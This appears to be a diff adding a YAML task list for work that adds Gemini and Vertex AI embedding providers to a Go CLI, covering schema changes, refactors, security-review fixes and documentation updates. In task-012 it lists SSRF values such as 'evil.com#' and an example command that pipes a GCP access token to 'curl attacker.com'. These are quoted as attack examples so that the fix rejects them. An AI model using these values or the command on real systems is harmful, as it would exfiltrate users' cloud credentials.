@@ -1,0 +1,851 @@
+feature: gemini-vertex-embedding-providers
+prd: ./prd-gemini-vertex-embedding-providers.md
+created_at: 2026-05-28T00:00:00Z
+updated_at: 2026-05-28T00:00:00Z
+
+tasks:
+  - id: task-001
+    title: "Add golang.org/x/oauth2 as a direct module dependency"
+    description: |
+      Add `golang.org/x/oauth2` to `go.mod` as a direct dependency so the
+      vertex provider can call `google.FindDefaultCredentials`. Run
+      `go mod tidy` and review the resulting `go.sum` diff to confirm new
+      transitive deps stay contained to oauth2 + ADC helpers (notably
+      `cloud.google.com/go/compute/metadata`). If the diff balloons beyond
+      that, raise it before continuing — vertex scope may need a rethink.
+    status: completed
+    dependencies: []
+    acceptance_criteria:
+      - "`go.mod` contains a direct `require golang.org/x/oauth2 ...` entry"
+      - "`go mod tidy` runs clean with no further diff"
+      - "`go.sum` diff is limited to oauth2 + small ADC-related transitive deps"
+      - "`make test` still passes (no other code changes yet)"
+    completed_at: 2026-05-28T00:00:00Z
+
+  - id: task-002
+    title: "Extend EmbedCredential schema with VertexProject and VertexLocation"
+    description: |
+      Add `VertexProject string` and `VertexLocation string` fields to
+      `EmbedCredential` in `common/clicfg/credentials/embed.go` with JSON
+      tags `"vertex-project,omitempty"` and `"vertex-location,omitempty"`.
+      Extend `EmbedCredentials.Add` with two trailing `vertexProject,
+      vertexLocation string` parameters and update all call sites. Update
+      `PrintableEmbedCredentials.AsArray` so the new keys appear in the
+      per-row map only when non-empty (keeps non-vertex tables narrow).
+      Update `embed_test.go` with cases that cover add+list for vertex
+      credentials and confirm empty fields are omitted for other providers.
+    status: completed
+    dependencies: []
+    acceptance_criteria:
+      - "`EmbedCredential` has the two new omitempty string fields"
+      - "`EmbedCredentials.Add` signature ends with `vertexProject, vertexLocation string`"
+      - "All `Add(...)` call sites in the repo compile with the new signature"
+      - "`PrintableEmbedCredentials.AsArray` omits vertex-* keys when empty and includes them when set"
+      - "`embed_test.go` has new cases verifying the above"
+      - "`make test` passes"
+    completed_at: 2026-05-28T00:00:00Z
+
+  - id: task-003
+    title: "Add gemini/vertex provider constants, env consts, Config fields, Resolve plumbing"
+    description: |
+      In `neo4j-cli/query/embed/embed.go` add provider constants
+      `ProviderGemini = "gemini"` and `ProviderVertex = "vertex"`, and env
+      constants `envGeminiKey = "GEMINI_API_KEY"` and
+      `envGoogleKey = "GOOGLE_API_KEY"`. Add two new fields to `Config`:
+      `VertexProject string` and `VertexLocation string`. In `Resolve`,
+      copy `base.VertexProject` / `base.VertexLocation` from the stored
+      credential into `Config` alongside the existing field copy. Do NOT
+      touch the `New` switch yet — the new providers should fall through to
+      the existing "invalid embed provider" default until tasks 005/006
+      wire them up. Update the default-case error message to also list
+      `gemini` and `vertex` in the "must be one of" copy (so the wiring is
+      ready when the cases are added).
+    status: completed
+    dependencies:
+      - task-002
+    acceptance_criteria:
+      - "`ProviderGemini` and `ProviderVertex` constants exist with the expected values"
+      - "`envGeminiKey` and `envGoogleKey` constants exist"
+      - "`Config` has `VertexProject` and `VertexLocation` string fields"
+      - "`Resolve` copies the two new fields from the base stored credential"
+      - "`New` default-case error message lists `gemini` and `vertex`"
+      - "`make test` and `make fmt-check` pass"
+    completed_at: 2026-05-28T00:00:00Z
+
+  - id: task-004
+    title: "Extend resolveAPIKey for the gemini env chain"
+    description: |
+      Update `resolveAPIKey` in `neo4j-cli/query/embed/embed.go` so that
+      when `provider == ProviderGemini` it layers `GEMINI_API_KEY` then
+      `GOOGLE_API_KEY` within each precedence stage (`.env`, OS env),
+      mirroring the existing openai/huggingface pattern. Also update
+      `osEnvSnapshot` to read both new env vars so `t.Setenv` in tests
+      picks them up. Add table-driven cases to the existing
+      `resolveAPIKey` tests (or wherever they live) covering: env order
+      `GEMINI_API_KEY` beats `GOOGLE_API_KEY` beats `NEO4J_EMBED_API_KEY`
+      beats stored, `.env` < OS env, stored alone, and the no-env case.
+    status: completed
+    dependencies:
+      - task-003
+    acceptance_criteria:
+      - "`resolveAPIKey` honours `GEMINI_API_KEY` → `GOOGLE_API_KEY` → `NEO4J_EMBED_API_KEY` → stored for the gemini provider"
+      - "`osEnvSnapshot` returns both new env vars"
+      - "New test cases cover the layered precedence and `.env` vs OS env"
+      - "`vertex` does not participate in `resolveAPIKey` (no test asserting it does)"
+      - "`make test` passes"
+    completed_at: 2026-05-28T00:00:00Z
+
+  - id: task-005
+    title: "Implement the gemini embedding provider"
+    description: |
+      Create `neo4j-cli/query/embed/gemini.go` mirroring `openai.go` in
+      shape: unexported `geminiProvider` struct (`cfg Config`,
+      `*http.Client`), `newGeminiProvider(cfg) *geminiProvider`, and
+      `Embed(ctx, text) ([]float32, error)`. Default base URL is
+      `https://generativelanguage.googleapis.com/v1beta`; URL pattern is
+      `{base}/models/{model}:embedContent`. Auth header is
+      `x-goog-api-key`. Request body shape per REQ-F-024. Always send
+      `taskType: "RETRIEVAL_QUERY"`. Response decode reads
+      `{embedding:{values:[...]}}`. When `cfg.Dimensions > 0 &&
+      cfg.Dimensions != 3072`, L2-normalize the returned vector
+      unconditionally before returning. Missing API key returns
+      `clierr.NewAuthError` listing `GEMINI_API_KEY`, `GOOGLE_API_KEY`,
+      `NEO4J_EMBED_API_KEY`, and the `credential embed add` path. Validate
+      base URL via `urlcheck.ValidateRemoteURL`. Non-2xx returns a wrapped
+      `gemini: HTTP <code>: <snippet>` error reading up to 4 KiB of body.
+      Add the `case ProviderGemini: return newGeminiProvider(cfg), nil`
+      branch to `New` in `embed.go`. Create `gemini_test.go` with
+      `httptest.NewServer` table-driven cases (happy path, dimensions
+      omitted when 0, missing key, non-2xx, normalization triggers when
+      dims != 3072).
+    status: completed
+    dependencies:
+      - task-003
+    acceptance_criteria:
+      - "`gemini.go` exists with `geminiProvider`, `newGeminiProvider`, and `Embed`"
+      - "URL, header, and request body match REQ-F-022/023/024"
+      - "`taskType` is always `RETRIEVAL_QUERY`"
+      - "Response is decoded from `{embedding:{values:[...]}}`"
+      - "L2-normalization fires only when `Dimensions > 0 && Dimensions != 3072`"
+      - "Missing API key returns `clierr.AuthError` listing the env chain"
+      - "Non-2xx returns a wrapped error with up-to-4KiB body snippet and no key leakage"
+      - "`New` has a `case ProviderGemini` that returns `newGeminiProvider(cfg)`"
+      - "`gemini_test.go` exercises the listed cases via `httptest`"
+      - "License header present; `make test`, `make fmt-check`, `make lint`, `make license-check` pass"
+    completed_at: 2026-05-28T00:00:00Z
+
+  - id: task-006
+    title: "Implement the vertex embedding provider"
+    description: |
+      Create `neo4j-cli/query/embed/vertex.go` for the Vertex AI provider.
+      Validation in `Embed` (not `newVertexProvider`) returns
+      `clierr.NewUsageError` for empty `VertexProject` or `VertexLocation`,
+      naming the corresponding flags and `credential embed add`. URL:
+      `https://{location}-aiplatform.googleapis.com/v1/projects/{project}/locations/{location}/publishers/google/models/{model}:predict`.
+      `cfg.BaseURL` is intentionally ignored. Request body shape per
+      REQ-F-043 (note `task_type` snake_case here, `parameters` omitted
+      when `Dimensions == 0`). Auth via `oauth2.TokenSource` from
+      `google.FindDefaultCredentials(ctx, "https://www.googleapis.com/auth/cloud-platform")`,
+      initialised lazily on first `Embed`. ADC failure returns
+      `clierr.NewAuthError` mentioning
+      `gcloud auth application-default login` and
+      `GOOGLE_APPLICATION_CREDENTIALS`. Add two package-level test seams:
+      one to override the token source, one to override the URL host
+      prefix (default builds the canonical URL). Response decode reads
+      `{predictions:[{embeddings:{values:[...]}}]}`. Do NOT normalize
+      output. Add the `case ProviderVertex: return newVertexProvider(cfg),
+      nil` branch to `New`. Create `vertex_test.go` with `httptest` +
+      stubbed token source covering: missing project, missing location,
+      missing ADC, happy path, dim-overlay sent in `parameters`, non-2xx,
+      no token in error messages.
+    status: completed
+    dependencies:
+      - task-001
+      - task-003
+    acceptance_criteria:
+      - "`vertex.go` exists with `vertexProvider`, `newVertexProvider`, and `Embed`"
+      - "Empty project or location yields `clierr.UsageError`"
+      - "URL is built from project/location and ignores `cfg.BaseURL`"
+      - "Request body uses `task_type` snake_case; `parameters` is omitted when `Dimensions == 0`"
+      - "Token source is lazy; ADC failure returns `clierr.AuthError` with the documented copy"
+      - "Token source and URL host prefix are overridable via package-level test seams"
+      - "Response decoded from `{predictions:[{embeddings:{values:[...]}}]}`"
+      - "No L2-normalization on the response"
+      - "`New` has a `case ProviderVertex` that returns `newVertexProvider(cfg)`"
+      - "`vertex_test.go` covers the listed cases without touching real ADC"
+      - "License header present; full test/lint/fmt/license gates pass"
+    completed_at: 2026-05-28T00:00:00Z
+
+  - id: task-007
+    title: "Extend `credential embed add` with vertex flags and provider entries"
+    description: |
+      In `neo4j-cli/internal/subcommands/credential/embed/add.go`, append
+      `"gemini"` and `"vertex"` to `validProviders`. Register two new
+      string flags `--vertex-project` and `--vertex-location` (both
+      defaulting to empty). Before calling `EmbedCredentials.Add`, enforce
+      two cross-flag rules: (1) when `--provider vertex`, both `--vertex-*`
+      flags must be non-empty (otherwise `clierr.NewUsageError`); (2) when
+      `--provider` is anything other than `vertex`, neither `--vertex-*`
+      flag may be set (also `clierr.NewUsageError`, copy: "--vertex-* flags
+      only apply when --provider=vertex"). Pass the two new values into
+      `EmbedCredentials.Add`. Update `add_test.go` (or its equivalent)
+      with rows for: gemini happy path, vertex happy path, vertex missing
+      project, vertex missing location, openai with stray --vertex-*
+      rejected.
+    status: completed
+    dependencies:
+      - task-002
+      - task-003
+    acceptance_criteria:
+      - "`validProviders` includes `gemini` and `vertex`"
+      - "`--vertex-project` and `--vertex-location` flags exist on `credential embed add`"
+      - "Missing vertex-* on `--provider vertex` returns a usage error naming both flags"
+      - "Stray vertex-* on a non-vertex provider returns a usage error"
+      - "`Add` is called with the new trailing args"
+      - "`add_test.go` covers the five listed cases"
+      - "`make test`, `make fmt-check`, `make lint` pass"
+    completed_at: 2026-05-28T00:00:00Z
+
+  - id: task-008
+    title: "Regenerate the skill bundle"
+    description: |
+      Run `go generate ./neo4j-cli/internal/skill/...` to refresh the skill
+      bundle after the cobra surface changes from tasks 002–007. Expected
+      diff: `references/credential.md` picks up the new flags and provider
+      list; other files only change if help text bled through. Commit the
+      bundle diff alongside the source. Verify `make generate-check`
+      passes (it runs `go generate ./...` then `git diff --exit-code` — a
+      passing run means no further drift).
+    status: completed
+    dependencies:
+      - task-005
+      - task-006
+      - task-007
+    acceptance_criteria:
+      - "`go generate ./neo4j-cli/internal/skill/...` produces a non-empty diff"
+      - "Diff includes `references/credential.md` with the new flags + providers"
+      - "Bundle changes are committed alongside the source"
+      - "`make generate-check` passes (no further drift)"
+      - "`TestGenerator_RoundTrip` passes"
+    completed_at: 2026-05-28T00:00:00Z
+
+  - id: task-009
+    title: "Add changie changelog entry"
+    description: |
+      Add a `Minor` changie entry for the new providers:
+      `changie new --projects neo4j-cli --kind Minor --body "Added Gemini
+      and Vertex AI embedding providers."`. If changie is not installed
+      locally, hand-author the YAML at
+      `.changes/unreleased/neo4j-cli-Minor-<YYYYMMDD>-<HHMMSS>.yaml`
+      with `project: neo4j-cli`, `kind: Minor`, single-quoted `body`, and
+      RFC3339 `time` (per AGENTS.md).
+    status: completed
+    dependencies: []
+    acceptance_criteria:
+      - "A `neo4j-cli-Minor-*.yaml` file exists in `.changes/unreleased/`"
+      - "The body reads exactly `Added Gemini and Vertex AI embedding providers.`"
+      - "`project: neo4j-cli` and `kind: Minor` are set"
+      - "`time:` is an RFC3339 timestamp"
+    completed_at: 2026-05-28T14:28:21Z
+
+  - id: task-010
+    title: "Fix gemini/vertex example model in `credential embed add`"
+    description: |
+      Both the Gemini and Vertex examples in
+      `neo4j-cli/internal/subcommands/credential/embed/add.go` (currently
+      around lines 58 and 61) use `--model text-embedding-004`. CLI-193's
+      whole point is unblocking users on Document Intelligence graphs that
+      embed with `gemini-embedding-001`, and the PRD's acceptance criteria
+      name that exact model. These examples ship into `--help` output AND
+      into the regenerated skill bundle at
+      `neo4j-cli/internal/skill/bundle/references/credential.md:312-315`,
+      so they're what every human user and every agent will copy. The
+      legacy `text-embedding-004` model won't match the vectors a DI graph
+      already stores, so following the example today produces broken
+      results. Change both examples to use
+      `--model gemini-embedding-001 --dimensions 3072`. Regenerate the
+      skill bundle via `go generate ./neo4j-cli/internal/skill/...` so
+      `references/credential.md` matches. `TestGenerator_RoundTrip` is
+      the gate.
+    status: completed
+    dependencies: []
+    acceptance_criteria:
+      - "Both Gemini and Vertex examples in `add.go` use `--model gemini-embedding-001 --dimensions 3072`"
+      - "Skill bundle regenerated; `references/credential.md` reflects the new examples"
+      - "`make test` passes (round-trip gate green)"
+      - "`make fmt-check` and `make lint` pass"
+    source: review
+    completed_at: 2026-05-28T12:42:14Z
+
+  - id: task-011
+    title: "Extract doJSONRequest helper; refactor all 5 embed providers"
+    description: |
+      The new `gemini.go` and `vertex.go` providers, along with the
+      existing `openai.go`, `huggingface.go`, and `ollama.go`, all
+      duplicate ~30 lines of identical JSON-POST boilerplate: build
+      `http.Request`, set `Content-Type`/`Accept`/`User-Agent`,
+      `client.Do(req)`, defer-close response body, status-range check,
+      read up to 4 KiB of body on non-2xx and wrap with
+      `<provider>: HTTP <code>: <snippet>`, `json.NewDecoder().Decode()`.
+      We now have 5 copies of this. The marginal cost of a 6th provider
+      keeps rising, and the "no auth header in error text" invariant
+      lives implicitly in 5 places.
+
+      Extract a `doJSONRequest` helper (or similarly named) inside the
+      `embed` package that takes context, *http.Client, method, URL,
+      request body (as bytes or marshallable struct), arbitrary headers
+      (the per-provider auth header plus standard set), the provider
+      name for the error prefix, and a decode target. The helper handles
+      URL validation via `urlcheck.ValidateRemoteURL`, marshalling (if
+      we pass a struct), request building, header setting (with
+      automatic Content-Type/Accept/User-Agent), Do(), status check, 4
+      KiB snippet on non-2xx, decode. Provider-specific auth headers
+      (Authorization Bearer, x-goog-api-key, etc.) are passed in via the
+      caller's headers map so the helper stays auth-agnostic.
+
+      Refactor all 5 providers to call the helper. Each `Embed` shrinks
+      to: validate required cfg fields, build the per-provider request
+      struct, call the helper, post-process (gemini normalizes;
+      huggingface picks the first sub-array; etc.). All existing tests
+      must pass unchanged — the helper is a pure refactor with no
+      observable behavior change. If a test relies on a specific error
+      wording, keep the wording the same.
+
+      Watch the boundaries: the helper must NOT echo any Authorization /
+      x-goog-api-key value into errors (the request, not the response,
+      carries them — same invariant as today), and the urlcheck step
+      must happen BEFORE the request is built so SSRF tests still pass.
+      Don't change file ownership of the per-provider structs — each
+      provider keeps its own request/response struct definitions in its
+      own file.
+    status: completed
+    dependencies:
+      - task-010
+    acceptance_criteria:
+      - "A `doJSONRequest`-style helper exists in the embed package and centralises HTTP request build + status check + 4KiB snippet + JSON decode"
+      - "All 5 providers (openai, ollama, huggingface, gemini, vertex) call the helper instead of duplicating the boilerplate"
+      - "Per-provider `Embed` methods are visibly shorter and contain only request-shape + post-processing logic"
+      - "No existing test required modification (pure refactor)"
+      - "`make test`, `make fmt-check`, `make lint`, `make license-check` all pass"
+      - "`make generate-check` still passes (no bundle drift introduced)"
+      - "Auth header values (Authorization Bearer / x-goog-api-key) still never appear in any error message"
+      - "`urlcheck.ValidateRemoteURL` still runs before the request is built so SSRF tests stay green"
+    source: review
+    completed_at: 2026-05-28T12:49:52Z
+
+  - id: task-012
+    title: "Validate VertexProject and VertexLocation against GCP naming patterns (SSRF + token exfil fix)"
+    description: |
+      Security review found a High-severity SSRF + OAuth bearer-token
+      exfiltration vector in the Vertex provider. `vertex.go` builds the
+      request host with raw string concatenation:
+      `vertexURLHostPrefix(p.cfg.VertexLocation)` →
+      `"https://" + location + "-aiplatform.googleapis.com"`.
+      `urlcheck.ValidateRemoteURL` runs AFTER that string is built and
+      only checks the post-parse `Host` field, so any `VertexLocation`
+      value whose URL parse separates the host from the
+      `-aiplatform.googleapis.com` suffix bypasses the check.
+
+      Verified attack values (each sends the user's cloud-platform-scoped
+      OAuth Bearer token to an attacker-controlled server):
+      - `--vertex-location 'evil.com#'` → request goes to `evil.com`
+      - `--vertex-location 'evil.com:8080/x'` → request goes to `evil.com:8080`
+      - `--vertex-location '@attacker.com'` → request goes to `attacker.com-aiplatform.googleapis.com`
+      - `--vertex-location 'x.attacker.com'` → request goes to `x.attacker.com-aiplatform.googleapis.com`
+
+      Realistic vector: a shared `credentials.json` or social-engineering
+      plants a credential with a malicious vertex-location. The next
+      `query --param q:embed=...` exfiltrates a ~1h GCP token granting
+      whatever the user's ADC identity owns — roughly equivalent to
+      `gcloud auth application-default print-access-token | curl
+      attacker.com -d @-`.
+
+      Fix at TWO layers (defense in depth):
+      1. **At credential-add time** in
+         `neo4j-cli/internal/subcommands/credential/embed/add.go`:
+         when `--provider vertex`, validate both flags against GCP's
+         naming rules and reject with `clierr.NewUsageError` BEFORE
+         storing.
+      2. **At Embed time** in `vertex.go`: validate again right after
+         the empty checks, BEFORE the URL is constructed. This catches
+         values written into `credentials.json` by direct file edit
+         (bypassing the CLI add path).
+
+      Patterns:
+      - `VertexLocation`: `^[a-z]+(-[a-z0-9]+)+$` (matches every real
+        GCP region: `us-central1`, `europe-west1`, `asia-northeast1`,
+        `northamerica-northeast2`, etc.).
+      - `VertexProject`: `^[a-z][a-z0-9-]{4,28}[a-z0-9]$` (6-30 chars,
+        starts with a letter, ends alphanumeric — matches GCP project
+        ID rules).
+
+      Tests: add explicit cases for the four attack strings in
+      `vertex_test.go` confirming `Embed` returns a `clierr.UsageError`
+      and NO HTTP request is dispatched. Use the existing test seam
+      machinery to assert no request goes out (e.g., fail the test if
+      the httptest handler fires). Add table-driven happy-path cases
+      for `us-central1`, `us-east1`, `europe-west1`,
+      `northamerica-northeast2`, `asia-southeast1`. Add equivalent
+      add-time tests in `add_test.go`.
+
+      Error messages: reference the offending value with `%q`, name
+      the flag (`--vertex-location` / `--vertex-project`), include a
+      sample of the expected format ("e.g. us-central1" / "must be a
+      GCP project ID like my-project-123").
+    status: completed
+    dependencies: []
+    acceptance_criteria:
+      - "Compiled regex constants for GCP region + project ID patterns exist as a single source of truth used by both `add.go` and `vertex.go`"
+      - "`vertexProvider.Embed` rejects malformed VertexLocation / VertexProject BEFORE URL construction or any HTTP dispatch"
+      - "`credential embed add --provider vertex` rejects malformed values BEFORE storing"
+      - "All four attack strings (`evil.com#`, `evil.com:8080/x`, `@attacker.com`, `x.attacker.com`) are rejected in tests for VertexLocation"
+      - "Five real GCP regions in the description are accepted in tests"
+      - "Equivalent coverage exists for VertexProject (≥2 attack cases + ≥2 legit cases)"
+      - "Tests assert NO HTTP request is dispatched when validation rejects (use a test seam or a failing handler)"
+      - "Error message references the offending value with `%q` and points the user at the right flag + expected format"
+      - "`make test`, `make fmt-check`, `make lint`, `make license-check` all pass"
+      - "`make generate-check` passes (no new bundle drift)"
+    source: review
+    completed_at: 2026-05-28T13:06:41Z
+
+  - id: task-013
+    title: "Cap happy-path response body read in doJSONRequest (DoS hardening)"
+    description: |
+      Security review found that `neo4j-cli/query/embed/httpjson.go`'s
+      happy path uses `raw, err := io.ReadAll(resp.Body)` with no size
+      limit. The error path correctly uses
+      `io.LimitReader(resp.Body, 4096)` but the success path doesn't.
+
+      A compromised proxy or an attacker-controlled `BaseURL` (gemini)
+      returning a 200 OK with a multi-GB body would exhaust memory.
+      Real embedding responses are <100 KB even at the full 3072 dims
+      gemini-embedding-001 returns.
+
+      Fix: wrap the happy-path read with
+      `io.LimitReader(resp.Body, 10<<20)` (10 MiB cap — ~100× the
+      largest legitimate embedding response, generous but blocks the
+      DoS surface). One-line change centralized in the helper; all 5
+      providers (openai, ollama, huggingface, gemini, vertex) are
+      hardened at once.
+
+      Test: add a case where the test server writes a body larger than
+      the cap (e.g., 11 MiB). Either of these is acceptable proof:
+      (a) the call returns a decode error because the truncated body
+      isn't valid JSON, or (b) the helper's returned bytes are exactly
+      10 MiB (the cap). The key invariant: the read does NOT allocate
+      the full 11 MiB.
+
+      Subtlety: if the body is exactly under the cap, behavior is
+      unchanged. At-or-over the cap the subsequent JSON decode fails
+      with "unexpected EOF" — that's the correct failure mode (caller
+      surfaces a decode error, not an OOM).
+    status: completed
+    dependencies:
+      - task-012
+    acceptance_criteria:
+      - "`doJSONRequest` happy-path read uses `io.LimitReader(resp.Body, 10<<20)` (or equivalent constant)"
+      - "Existing tests still pass unmodified"
+      - "A new test exercises an oversize body and confirms the read is bounded"
+      - "`make test`, `make fmt-check`, `make lint`, `make license-check` all pass"
+    source: review
+    completed_at: 2026-05-28T13:25:00Z
+
+  - id: task-014
+    title: "Scrub sensitive query params from URL in doJSONRequest network errors"
+    description: |
+      Security review found that Go's `net/http` includes the full
+      request URL in `client.Do` error strings (`Post
+      "https://host?key=AIza...": dial tcp ...`). If a user puts an API
+      key in the URL query string (Google's docs show both
+      `x-goog-api-key` header AND `?key=<key>` query auth styles),
+      network errors propagate the URL — and the key — into stderr,
+      telemetry, and any error-aggregating consumer.
+
+      The implementation correctly puts the gemini key in the
+      `x-goog-api-key` header (so this is opt-in user misconfiguration,
+      not a default flaw). But it's a sharp foot-gun, and the fix is
+      cheap and once-and-done in the new helper.
+
+      Fix: in `doJSONRequest`'s `request failed:` and `build request:`
+      branches (`httpjson.go`), scrub sensitive query parameters from
+      the URL in the wrapped error. Define an unexported helper inside
+      the embed package (e.g., `redactSensitiveURLParams(err error) error`)
+      that operates on the error's `Error()` string.
+
+      Implementation approach (simplest workable): regex match
+      `(?i)([?&](?:key|api_key|access_token|token)=)[^&"\s]+` and
+      replace the matched value with `${1}REDACTED`. Wrap as
+      `errors.New(redacted)` and return. This loses the wrapped error
+      chain but is robust to any URL format Go ever uses — document
+      the trade-off in a comment.
+
+      Apply ONLY at the `request failed:` and `build request:` wrap
+      sites in `doJSONRequest`. URL validation errors (`url rejected:`)
+      come from `urlcheck.ValidateRemoteURL` which already doesn't
+      echo the URL.
+
+      Tests:
+      - Unit test: call the redaction helper with crafted error
+        strings containing `?key=AIza...`, `&api_key=...`,
+        `?access_token=...`, `?token=...`; confirm each value is
+        replaced with `REDACTED` (case-insensitive).
+      - Integration test: point a provider at an `httptest.Server`
+        URL with a sensitive query param, close the connection
+        mid-read to force a network error, assert the resulting
+        error message contains `REDACTED` and NOT the original key
+        value.
+    status: completed
+    dependencies:
+      - task-012
+    acceptance_criteria:
+      - "Unexported helper in the embed package redacts known-sensitive query params from error strings"
+      - "Helper applied at `request failed:` and `build request:` wrap sites in `doJSONRequest`"
+      - "Unit tests cover `key`, `api_key`, `access_token`, `token` param redaction (case-insensitive)"
+      - "Integration test confirms redaction fires on a real network error path"
+      - "Existing provider tests still pass unmodified"
+      - "`make test`, `make fmt-check`, `make lint`, `make license-check` all pass"
+    source: review
+    completed_at: 2026-05-28T13:45:00Z
+
+  - id: task-015
+    title: "Collapse redundant empty checks in vertexProvider.Embed (code-judo)"
+    description: |
+      Review found that the empty-string checks at the top of
+      `neo4j-cli/query/embed/vertex.go` `Embed` (around lines 138-145)
+      are dead code in the presence of the regex validators introduced
+      by task-012. The validators reject any string that doesn't match:
+      - VertexLocation: `^[a-z]+(-[a-z0-9]+)+$`
+      - VertexProject: `^[a-z][a-z0-9-]{4,28}[a-z0-9]$`
+      Neither pattern matches the empty string, so the explicit `if
+      p.cfg.VertexProject == ""` and `if p.cfg.VertexLocation == ""`
+      blocks are unreachable in any case the validator wouldn't already
+      catch. Eight redundant lines + one concept (empty vs invalid) that
+      future readers have to mentally diff against the validator.
+
+      The keep-argument was that the empty-case error message points at
+      the recovery command (`neo4j-cli credential embed add
+      --vertex-project <project> --vertex-location <location>`) which
+      the invalid-case ("must be a GCP project ID like ...") doesn't.
+      Solve that inside the validator instead: branch on empty up-top
+      and emit a missing-style message, then fall through to the
+      pattern check. Single source of truth, one concept.
+
+      Suggested shape (apply to both validators):
+
+      ```go
+      func ValidateVertexLocation(location string) error {
+          if location == "" {
+              return clierr.NewUsageError(
+                  "missing --vertex-location: set one with `neo4j-cli credential embed add --vertex-location <region>`")
+          }
+          if !vertexLocationPattern.MatchString(location) {
+              return clierr.NewUsageError(...) // existing invalid-format message
+          }
+          return nil
+      }
+      ```
+
+      Then delete the four `if p.cfg.Vertex... == ""` lines in `Embed`.
+      Net diff: -8 lines in vertex.go's Embed, +6 lines across the two
+      validators, plus a clearer mental model.
+
+      Important: DO NOT touch the add.go cross-flag check (`if
+      vertexProject == "" || vertexLocation == ""` returning "requires
+      both"). That message is more pointed than two separate per-field
+      "missing X" errors when the user forgot both flags at once, and
+      add.go isn't the duplicated-defense-in-depth layer — vertex.go is.
+
+      Tests: the existing `TestVertex_Embed_MissingProject` /
+      `TestVertex_Embed_MissingLocation` cases (or whatever names they
+      have) will need their error-message assertions updated to match
+      the validator's new missing-style message. Run them and confirm
+      they pass. Add no new tests — this is purely a refactor that
+      preserves UX.
+    status: completed
+    dependencies: []
+    acceptance_criteria:
+      - "`ValidateVertexLocation` and `ValidateVertexProject` each branch on empty input and emit a missing-style usage error before the pattern check"
+      - "The four `if p.cfg.Vertex... == \"\"` blocks at the top of `vertexProvider.Embed` are deleted"
+      - "Existing `TestVertex_Embed_MissingProject` / `TestVertex_Embed_MissingLocation` tests pass (with their assertions updated to the new message if needed)"
+      - "No change to add.go's cross-flag `requires both` check"
+      - "All other tests pass unmodified"
+      - "`make test`, `make fmt-check`, `make lint`, `make license-check` all pass"
+    source: review
+    completed_at: 2026-05-28T16:15:00Z
+
+  - id: task-016
+    status: completed
+    title: "Update stale provider lists in help text and docs (gemini + vertex coverage)"
+    description: |
+      Audit of the live binary (`bin/neo4j-cli credential embed -h`,
+      `bin/neo4j-cli query -h`) revealed that five surfaces still list
+      only the old three providers (openai/ollama/huggingface) and do
+      not mention `gemini` / `vertex`. The `credential embed add` leaf
+      was updated correctly by task-007 (so the leaf help is fine), but
+      the parent command, the `query --embed-provider` flag
+      description, and the README + .agents docs were left stale. The
+      result: an agent reading the parent help text would conclude only
+      three providers exist.
+
+      Surfaces to fix:
+
+      1. `neo4j-cli/internal/subcommands/credential/embed/embed.go:17`
+         — the parent `credential embed` cmd's Long string ends with
+         "Supported providers: openai, ollama, huggingface." Change to
+         "Supported providers: openai, ollama, huggingface, gemini,
+         vertex."
+
+      2. `neo4j-cli/query/query.go:76` — the `--embed-provider`
+         persistent-flag usage is currently
+         `"Embedding provider: openai | ollama | huggingface [env: NEO4J_EMBED_PROVIDER]"`.
+         Change to
+         `"Embedding provider: openai | ollama | huggingface | gemini | vertex [env: NEO4J_EMBED_PROVIDER]"`.
+
+      3. `README.md:84` — line currently reads "Supported providers:
+         `openai`, `ollama`, `huggingface`." Add `gemini` and `vertex`
+         to the list.
+
+      4. `README.md:304` — Provider defaults currently lists OpenAI,
+         Ollama, HuggingFace base URLs only. Extend with: Gemini base
+         URL `https://generativelanguage.googleapis.com/v1beta` (used
+         at `{base}/models/{model}:embedContent`); Vertex uses a
+         location-derived URL (no `--embed-base-url` knob — set
+         `--vertex-project` / `--vertex-location` instead) and
+         authenticates via Application Default Credentials.
+
+      5. `.agents/query.md:40` — internal doc quotes the stale error
+         message verbatim: "unknown provider returns 'invalid embed
+         provider %q: must be one of openai, ollama, huggingface'".
+         The actual error message in `embed.go`'s `New` default branch
+         now reads "must be one of openai, ollama, huggingface, gemini,
+         vertex". Update the quote.
+
+      After the source edits, regenerate the skill bundle (`go
+      generate ./neo4j-cli/internal/skill/...`) — the parent embed.go
+      Long and the `--embed-provider` flag description both flow into
+      `references/credential.md`, `references/query.md`, and SKILL.md.
+      `TestGenerator_RoundTrip` is the gate.
+
+      Verification commands:
+      - `make build && bin/neo4j-cli credential embed -h` — must show
+        all five providers in the description.
+      - `bin/neo4j-cli query -h | grep embed-provider` — must show
+        all five providers.
+      - `bin/neo4j-cli credential embed add -h` — already correct;
+        confirm unchanged.
+
+      No new tests needed (these are doc / help-text edits picked up
+      by the existing round-trip gate).
+    dependencies: []
+    acceptance_criteria:
+      - "Parent `credential embed` cmd Long string lists all five providers"
+      - "`--embed-provider` persistent-flag usage on `query` lists all five providers"
+      - "README.md line 84 lists all five providers"
+      - "README.md provider defaults section documents Gemini base URL and Vertex location-derived URL + ADC auth"
+      - ".agents/query.md error-message quote includes gemini and vertex"
+      - "Skill bundle regenerated; `TestGenerator_RoundTrip` passes"
+      - "`bin/neo4j-cli credential embed -h` and `bin/neo4j-cli query -h` live output reflects all five providers"
+      - "`make test`, `make fmt-check`, `make lint`, `make license-check`, `make generate-check` all pass"
+    source: review
+    completed_at: 2026-05-28T16:45:00Z
+
+  - id: task-017
+    title: "Document gemini env chain + vertex ADC in README API-key section"
+    description: |
+      `README.md:298-300` describes API-key configuration but only
+      references the legacy env vars. Specifically:
+
+      Line 298 (the API-key table row):
+      ```
+      | API key | (none — see below) | `NEO4J_EMBED_API_KEY`, `OPENAI_API_KEY`, `HF_TOKEN` |
+      ```
+      Missing: `GEMINI_API_KEY`, `GOOGLE_API_KEY`. Also doesn't note
+      that vertex doesn't take an API key at all (uses ADC).
+
+      Line 300 (the precedence prose):
+      ```
+      API-key precedence (highest first): per-provider OS env
+      (`OPENAI_API_KEY` / `HF_TOKEN`) → generic OS env
+      (`NEO4J_EMBED_API_KEY`) → per-provider `.env` value → generic
+      `.env` value → stored credential `api-key`. Ollama needs no
+      API key.
+      ```
+      Missing: the gemini-specific chain (`GEMINI_API_KEY` →
+      `GOOGLE_API_KEY` → `NEO4J_EMBED_API_KEY` → stored). Also missing
+      a sentence on Vertex: it does NOT participate in the API-key
+      precedence — it authenticates via Application Default
+      Credentials (`gcloud auth application-default login` or a
+      service-account JSON via `GOOGLE_APPLICATION_CREDENTIALS`).
+
+      A user or agent reading this section today and trying to set up
+      Gemini via env-var would not see `GEMINI_API_KEY` documented.
+
+      Fix:
+
+      1. Extend the API-key table row's "Env var" cell to include
